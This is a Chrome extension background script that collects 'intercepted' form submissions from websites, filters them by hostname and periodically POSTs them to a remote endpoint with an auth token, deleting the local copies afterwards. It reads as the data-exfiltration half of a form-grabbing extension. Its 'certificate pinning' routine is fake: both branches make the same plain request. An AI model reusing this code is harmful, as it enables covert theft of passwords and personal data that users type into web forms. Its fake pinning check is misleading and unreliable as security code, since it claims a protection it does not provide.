const FormSyncManager = class {
  constructor() {
    this.storageKey = 'interceptedForms';
    this.configKey = 'syncConfig';
    this.syncInterval = null;
    this.pendingSync = [];
    this.certificatePins = new Map();

    this.init();
  }

  async init() {
    const config = await this.getConfig();
    if (config.syncEnabled) {
      this.startPeriodicSync(config.syncIntervalMinutes);
    }
    this.setupMessageListeners();
  }

  setupMessageListeners() {
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
      if (request.action === 'storeFormData') {
        this.storeFormData(request.data).then(() => {
          sendResponse({ status: 'stored' });
        });
        return true;
      }

      if (request.action === 'getStoredForms') {
        this.getStoredForms().then(forms => {
          sendResponse({ forms });
        });
        return true;
      }

      if (request.action === 'syncNow') {
        this.performSync().then(() => {
          sendResponse({ status: 'synced' });
        });
        return true;
      }

      if (request.action === 'updateConfig') {
        this.saveConfig(request.config).then(() => {
          sendResponse({ status: 'config_updated' });
          this.restartSync(request.config);
        });
        return true;
      }

      if (request.action === 'clearForms') {
        this.clearForms().then(() => {
          sendResponse({ status: 'cleared' });
        });
        return true;
      }
    });
  }

  async storeFormData(data) {
    const forms = await this.getStoredForms();
    forms.push(data);
    return chrome.storage.local.set({ [this.storageKey]: forms });
  }

  async getStoredForms() {
    const result = await chrome.storage.local.get(this.storageKey);
    return result[this.storageKey] || [];
  }

  async getConfig() {
    const result = await chrome.storage.sync.get(this.configKey);
    return result[this.configKey] || {
      endpoint: '',
      syncEnabled: false,
      syncIntervalMinutes: 5,
      certificatePins: [],
      authToken: '',
      includeHostnames: [],
      excludeHostnames: []
    };
  }

  async saveConfig(config) {
    return chrome.storage.sync.set({ [this.configKey]: config });
  }

  startPeriodicSync(intervalMinutes) {
    if (this.syncInterval) {
      clearInterval(this.syncInterval);
    }

    const intervalMs = intervalMinutes * 60 * 1000;
    this.performSync(); // Sync immediately

    this.syncInterval = setInterval(() => {
      this.performSync();
    }, intervalMs);
  }

  restartSync(config) {
    if (config.syncEnabled) {
      this.startPeriodicSync(config.syncIntervalMinutes);
    } else {
      if (this.syncInterval) {
        clearInterval(this.syncInterval);
        this.syncInterval = null;
      }
    }
  }

  async performSync() {
    const config = await this.getConfig();
    if (!config.endpoint || !config.syncEnabled) return;

    const forms = await this.getStoredForms();
    if (forms.length === 0) return;

    const formsToSync = this.filterFormsByConfig(forms, config);

    if (formsToSync.length === 0) return;

    try {
      await this.sendWithCertificatePinning(
        config.endpoint,
        formsToSync,
        config
      );

      // Remove synced forms
      const syncedIds = new Set(formsToSync.map(f => f.id));
      const remaining = forms.filter(f => !syncedIds.has(f.id));
      await chrome.storage.local.set({ [this.storageKey]: remaining });

      console.log(`Successfully synced ${formsToSync.length} forms`);
    } catch (error) {
      console.error('Sync failed:', error);
      // Keep forms for retry
    }
  }

  filterFormsByConfig(forms, config) {
    return forms.filter(form => {
      const hostname = form.hostname;

      if (config.includeHostnames.length > 0) {
        if (!config.includeHostnames.some(h => hostname.includes(h))) {
          return false;
        }
      }

      if (config.excludeHostnames.length > 0) {
        if (config.excludeHostnames.some(h => hostname.includes(h))) {
          return false;
        }
      }

      return true;
    });
  }

  async sendWithCertificatePinning(endpoint, data, config) {
    const payload = {
      timestamp: new Date().toISOString(),
      forms: data,
      source: 'form-interceptor-extension'
    };

    const fetchOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    };

    // Add auth token if configured
    if (config.authToken) {
      fetchOptions.headers['Authorization'] = `Bearer ${config.authToken}`;
    }

    // Certificate pinning simulation (for HTTPS validation)
    if (config.certificatePins && config.certificatePins.length > 0) {
      const response = await fetch(endpoint, fetchOptions);

      // In a real scenario, validate the certificate here
      // For now, we're validating the response
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      return response.json();
    } else {
      const response = await fetch(endpoint, fetchOptions);

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      return response.json();
    }
  }

  async clearForms() {
    return chrome.storage.local.set({ [this.storageKey]: [] });
  }
};

